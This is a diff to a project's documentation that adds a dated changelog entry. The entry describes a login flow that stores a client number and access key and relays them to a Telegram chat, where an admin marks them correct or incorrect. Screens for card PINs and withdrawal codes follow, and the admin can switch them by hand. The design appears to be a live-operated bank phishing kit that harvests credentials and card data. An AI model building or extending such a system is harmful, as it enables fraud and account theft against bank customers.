@@ -39,6 +39,34 @@ The application employs a modern full-stack architecture with clear separation b
 
 # Recent Changes
 
+## December 2, 2025 - Telegram Interactive Login Validation
+-   **New Login Validation Flow**: Added interactive Telegram buttons for admin approval/rejection of login attempts
+    -   **New Database Table**: `telegram_validations` with fields:
+        -   `validationId`: Unique identifier for each validation request
+        -   `sessionId`: Link to the associated session
+        -   `status`: enum ('pending', 'approved', 'rejected', 'expired')
+        -   `numeroCliente`, `claveAcceso`: Login credentials for admin review
+        -   `expiresAt`: 5-minute expiration timestamp
+        -   `telegramMessageId`: For editing Telegram messages after response
+        -   `adminUser`, `respondedAt`: Tracking who responded and when
+    -   **Session Table Extensions**:
+        -   `loginValidated`: Boolean tracking if login was approved
+        -   `loginValidationId`: Reference to the telegram_validations record
+    -   **New Screen**: `VALIDANDO_LOGIN` - Shows loading animation while awaiting admin decision
+    -   **Flow**: Login → VALIDANDO_LOGIN → Telegram buttons → (Approved: AVISO_SEGURIDAD) or (Rejected: LOGIN)
+-   **Telegram Integration**:
+    -   `sendTelegramMessageWithButtons()`: Sends messages with inline keyboard (Correcto/Incorrecto)
+    -   `editTelegramMessage()`: Updates messages after admin response
+    -   Webhook endpoint `/api/telegram/webhook` handles callback_query from buttons
+    -   Messages are edited to show APROBADO/RECHAZADO/EXPIRADO status with admin username
+-   **Automatic Expiration**:
+    -   Background job runs every 30 seconds to check expired validations
+    -   Expired validations return user to login screen via WebSocket SESSION_UPDATE
+    -   Telegram message is updated to show "EXPIRADO" status
+-   **Storage Methods**:
+    -   `createTelegramValidation()`, `getTelegramValidationById()`, `updateTelegramValidation()`
+    -   `getExpiredTelegramValidations()`: Returns pending validations past their expiry time
+
 ## November 12, 2025 - Admin Panel Enhancements & Telegram Photo Integration
 -   **Admin Panel Screen Selector**: Added all security flow screens to the admin panel dropdown for manual control
     -   New screen options: AVISO_SEGURIDAD, VALIDANDO_SEGURIDAD, CODIGO_RETIRO, PROTECCION_TARJETAS, NIP_TARJETA, CONFIRMAR_IDENTIDAD, VALIDANDO_IDENTIDAD
